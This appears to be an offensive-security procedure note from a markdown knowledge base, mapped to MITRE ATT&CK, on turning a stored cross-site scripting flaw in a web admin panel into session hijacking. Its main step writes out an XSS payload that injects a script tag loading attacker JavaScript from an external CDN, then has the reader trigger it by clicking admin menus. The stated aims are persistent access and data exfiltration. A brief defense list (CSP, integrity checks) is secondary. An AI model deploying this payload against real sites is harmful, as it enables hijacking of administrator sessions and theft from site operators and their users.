---
id: proc-005
tags:
  - session-hijack
  - external-injection
type: procedure
tools:
  - '[[tools/Google-Chrome]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/inject-external-malicious-script]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:30:18.392Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Remote File Copy]]'
---
# Inject-External-Script-for-Session-Hijacking

## Summary

Update the XSS payload to inject an external malicious script, enabling persistent control after user interaction in the admin panel.

## Description

Replace the basic XSS with a script that appends an external JS from CDN to the head, loading a hacking package. After trigger, clicking admin menus executes it fully, hijacking the session.

## Requirements

1. Basic XSS working
2. External script hosted (e.g., jsdelivr)
3. Repeat prior triggers

## Defense

- CSP to block external script loads
- Script integrity checks
- Monitor DOM mutations in admin

## Objectives

1. Escalate from one-time XSS to persistent access
2. Hijack admin session
3. Enable further actions like data exfil

## Instructions

### Step 1: Update Payload

**Context**: Modify /pages/xss content.

**Command** ([[commands/inject-external-malicious-script]]):
```html
<script>document.getElementsByTagName('head')[0].innerHTML +='<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/[YOU_HACK_PACKAGE]/dist/webpack.js"/>'</script>
```

> Save page. Expected output: External src ready.

### Step 2: Re-trigger and Interact

**Context**: Repeat steps 2-4 from chain.

**Instructions**: Trigger, then click 'orders' in admin.

> External script loads. Expected output: Full compromise indicators.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]
- [[Remote File Copy]]

### Sub-Techniques


## Commands Used

- [[commands/inject-external-malicious-script]]

## Tools Used

- [[tools/Google-Chrome]]

## Tags

- session-hijack
- external-injection
